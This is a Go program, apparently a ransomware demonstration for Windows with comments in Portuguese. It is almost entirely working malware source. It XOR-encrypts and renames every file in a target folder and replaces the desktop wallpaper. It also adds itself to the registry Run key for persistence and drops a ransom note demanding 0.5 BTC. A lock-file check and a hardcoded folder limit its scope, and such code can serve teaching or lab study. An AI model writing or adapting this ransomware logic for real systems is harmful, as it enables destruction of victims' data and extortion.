package main

import (
	_ "embed"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

//go:embed wallpaper.jpg
var wallpaperData []byte

const (
	password             = "123"
	spiSetDeskWallpaper  = 0x0014
	spiGetDeskWallpaper  = 0x0073
	spifUpdateIniFile    = 0x01
	spifSendWinIniChange = 0x02
	targetDir            = `C:\teste`
	wallpaperBackup      = "original_wallpaper.txt"
)

var (
	user32           = windows.NewLazySystemDLL("user32.dll")
	systemParameters = user32.NewProc("SystemParametersInfoW")
)

// ======================= FUNÇÕES PRINCIPAIS =======================

func xorEncrypt(data []byte) []byte {
	encrypted := make([]byte, len(data))
	for i := range data {
		encrypted[i] = data[i] ^ password[i%len(password)]
	}
	return encrypted
}

func getCurrentWallpaper() (string, error) {
	var path [256]uint16
	ret, _, _ := systemParameters.Call(
		uintptr(spiGetDeskWallpaper),
		uintptr(256),
		uintptr(unsafe.Pointer(&path[0])),
		0,
	)

	if ret == 0 {
		return "", fmt.Errorf("falha ao obter wallpaper")
	}
	return windows.UTF16ToString(path[:]), nil
}

func setNewWallpaper() error {
	// Criar pasta se não existir
	if err := os.MkdirAll(targetDir, 0755); err != nil {
		return fmt.Errorf("falha ao criar pasta: %v", err)
	}

	// Salvar wallpaper.jpg
	wallpaperPath := filepath.Join(targetDir, "wallpaper.jpg")
	if err := ioutil.WriteFile(wallpaperPath, wallpaperData, 0644); err != nil {
		return fmt.Errorf("falha ao salvar wallpaper: %v", err)
	}

	// Alterar wallpaper
	pathUTF16, err := windows.UTF16PtrFromString(wallpaperPath)
	if err != nil {
		return err
	}

	ret, _, _ := systemParameters.Call(
		uintptr(spiSetDeskWallpaper),
		0,
		uintptr(unsafe.Pointer(pathUTF16)),
		uintptr(spifUpdateIniFile|spifSendWinIniChange),
	)

	if ret == 0 {
		return fmt.Errorf("falha ao alterar o wallpaper")
	}
	return nil
}

func addToStartup() {
	exePath := filepath.Join(targetDir, "encryptor.exe")
	key, _, err := registry.CreateKey(
		registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE,
	)
	if err != nil {
		return
	}
	defer key.Close()
	key.SetStringValue("RansomDemo", exePath)
}

func logActivity(message string) {
	logEntry := fmt.Sprintf("[%s] %s\n", time.Now().Format("2006-01-02 15:04:05"), message)
	ioutil.WriteFile(filepath.Join(targetDir, "attack_log.txt"), []byte(logEntry), 0644)
}

func isVM() bool {
	// Verificação simplificada: arquivo de controle
	_, err := os.Stat(filepath.Join(targetDir, "safe_mode.lock"))
	return !os.IsNotExist(err)
}

func main() {
	if !isVM() {
		fmt.Println("ERRO: Execute apenas em ambiente controlado!")
		return
	}

	logActivity("Início da criptografia")

	// Salvar wallpaper original
	originalWallpaper, err := getCurrentWallpaper()
	if err == nil {
		ioutil.WriteFile(filepath.Join(targetDir, wallpaperBackup), []byte(originalWallpaper), 0644)
		logActivity("Wallpaper original salvo")
	} else {
		fmt.Println("[AVISO] Não foi possível salvar o wallpaper original.")
	}

	// Alterar wallpaper
	if err := setNewWallpaper(); err != nil {
		logActivity("Falha ao alterar wallpaper: " + err.Error())
		fmt.Println("[ERRO]", err)
		return
	}
	logActivity("Wallpaper alterado para: " + filepath.Join(targetDir, "wallpaper.jpg"))

	// Simular persistência
	addToStartup()
	logActivity("Adicionado à inicialização do sistema")

	// Criptografar arquivos
	filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() || filepath.Base(path) == "wallpaper.jpg" {
			return nil
		}

		data, _ := ioutil.ReadFile(path)
		encryptedData := xorEncrypt(data)
		ioutil.WriteFile(path, encryptedData, 0644)

		newName := "[RANSOM]" + info.Name() + ".aeehh"
		os.Rename(path, filepath.Join(filepath.Dir(path), newName))

		logActivity("Arquivo criptografado: " + path)
		return nil
	})

	// Criar mensagem de resgate
	rescueNote := []byte(`  
███████▄▄███████████▄  
▓▓▓▓▓▓█░░░░░░░░░░░░░░█  ☠️ SEUS ARQUIVOS FORAM SEQUESTRADOS!  
▓▓▓▓▓▓█░░░░░░░░░░░░░░█  PAGUE 0.5 BTC EM 48H OU TUDO SERÁ VAZADO!  
`)
	ioutil.WriteFile(filepath.Join(targetDir, "!!!WARNING!!!.txt"), rescueNote, 0644)
	logActivity("Mensagem de resgate criada")

	fmt.Println("[!] Criptografia concluída. Chave:", password)
}
